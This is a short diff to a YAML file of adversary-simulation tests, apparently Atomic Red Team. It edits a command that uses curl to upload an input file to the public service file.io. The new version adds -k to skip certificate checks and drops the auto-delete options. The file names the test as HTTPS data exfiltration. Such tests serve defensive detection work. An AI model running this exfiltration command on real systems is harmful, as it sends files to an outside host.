@@ -38,7 +38,7 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      #{curl_path} -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+      #{curl_path} -k -F "file=@#{input_file}" https://file.io/
 - name: Exfiltrate data HTTPS using curl freebsd,linux or macos
   auto_generated_guid: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
   description: |
